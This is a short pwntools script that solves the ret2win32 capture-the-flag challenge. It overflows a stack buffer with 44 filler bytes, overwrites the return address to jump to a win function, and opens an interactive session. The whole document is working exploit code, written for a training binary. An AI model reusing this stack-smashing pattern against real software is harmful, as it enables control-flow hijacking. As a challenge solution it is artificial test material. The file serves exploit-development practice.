from pwn import *
p=process("./ret2win32")
p.readuntil("> ")
payload="A"*44+p32(0x8048659)
p.send(payload)
p.interactive()
